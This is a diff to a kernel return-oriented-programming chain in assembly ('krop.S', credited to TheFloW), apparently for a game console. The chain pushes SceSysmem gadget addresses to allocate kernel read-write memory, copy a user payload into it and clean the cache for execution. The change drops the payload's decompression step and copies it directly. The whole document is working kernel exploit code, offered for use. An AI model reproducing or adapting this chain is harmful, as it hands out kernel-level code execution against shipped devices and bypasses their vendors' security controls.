@@ -1,6 +1,6 @@
 /* krop.S -- kernel rop chain
  *
- * Copyright (C) 2018 TheFloW
+ * Copyright (C) 2018 TheFloW, 2026 of-ravens-claw
  *
  * This software may be modified and distributed under the terms
  * of the MIT license.  See the LICENSE file for details.
@@ -9,13 +9,8 @@
 #include "koffsets.S"
 
 // Variables that lie in the kernel stack
-.equ payload_temp_block,   0x00
-.equ payload_temp_blockid, 0x04
-.equ payload_code_block,   0x08
-.equ payload_code_blockid, 0x0C
-
-// Max decompressed payload size; Currently 1 MB, must be a multiple of 4096 bytes!
-.equ MAX_PAYLOAD_DECOMPRESSED_SIZE, 0x100000
+.equ payload_code_block,   0x00
+.equ payload_code_blockid, 0x04
 
 .macro init_krop dst
   .set krop_chain, \dst
@@ -38,33 +33,11 @@
   // Init krop chain
   init_krop \dst
 
-  // Allocate temporary block
-  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
-  push 1, SceSysmem_empty_string                       // r0
-  push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW           // r1
-  push 0, (payload_size + 0xFFF) & ~0xFFF              // r2
-  push 0, NULL                                         // r3
-  push 1, SceSysmem_sceKernelAllocMemBlockForKernel    // r4
-  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
-  push 2, payload_temp_blockid                         // r4
-  push 1, SceSysmem_str_r0_r4_movs_r0_0_pop_r4_pc      // pc
-  push 9, 0xDEADBEEF                                   // r4
-
-  // Get temporary block
-  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
-  push 2, payload_temp_blockid                         // r0
-  push 2, payload_temp_block                           // r1
-  push 9, 0xDEADBEEF                                   // r2
-  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
-  push 1, SceSysmem_sceKernelGetMemBlockBase           // r4
-  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
-  push 9, 0xDEADBEEF                                   // r4
-
   // Allocate code block
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
   push 1, SceSysmem_empty_string                       // r0
   push 0, SCE_KERNEL_MEMBLOCK_TYPE_KERNEL_RW           // r1
-  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r2
+  push 0, (payload_size + 0xFFF) & ~0xFFF              // r2
   push 0, NULL                                         // r3
   push 1, SceSysmem_sceKernelAllocMemBlockForKernel    // r4
   push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
@@ -82,38 +55,13 @@
   push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
   push 9, 0xDEADBEEF                                   // r4
 
-  // Copy compressed payload from user to temporary block
+  // Copy payload from user to code block
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
-  push 2, payload_temp_block                           // r0
+  push 2, payload_code_block                           // r0
   push 0, payload_start                                // r1
   push 0, payload_size                                 // r2
   push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
   push 1, SceSysmem_sceKernelCopyFromUser              // r4
-  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
-  push 9, 0xDEADBEEF                                   // r4
-
-  // Decompress payload to code block
-  push 1, SceSysmem_pop_r3_r4_r5_pc                    // pc
-  push 1, SceSysmem_pop_pc                             // r3
-  push 1, SceSysmem_sceDeflateDecompress               // r4
-  push 2, payload_temp_block - 0x14                    // r5
-  push 1, SceSysmem_ldr_r2_r5_14_blx_r3                // pc
-  push 1, SceSysmem_pop_r0_r1_pc                       // pc
-  push 2, payload_code_block                           // r0
-  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r1
-  push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
-  push 1, SceSysmem_pop_r3_pc                          // pc
-  push 0, NULL                                         // r3
-  push 1, SceSysmem_blx_r4_pop_r4_pc                   // pc
-  push 9, 0xDEADBEEF                                   // r4
-
-  // Free temporary block
-  push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
-  push 2, payload_temp_blockid                         // r0
-  push 9, 0xDEADBEEF                                   // r1
-  push 9, 0xDEADBEEF                                   // r2
-  push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
-  push 1, SceSysmem_sceKernelFreeMemBlock              // r4
   push 1, SceSysmem_ldr_r0_r0_blx_r3                   // pc
   push 9, 0xDEADBEEF                                   // r4
 
@@ -130,7 +78,7 @@
   // Clean cache
   push 1, SceSysmem_pop_r0_r1_r2_r3_r4_pc              // pc
   push 2, payload_code_block                           // r0
-  push 0, MAX_PAYLOAD_DECOMPRESSED_SIZE                // r1
+  push 0, (payload_size + 0xFFF) & ~0xFFF              // r1
   push 9, 0xDEADBEEF                                   // r2
   push 1, SceSysmem_blx_r4_pop_r4_pc                   // r3
   push 1, SceSysmem_sceKernelDcacheCleanRangeForL1WBWA // r4
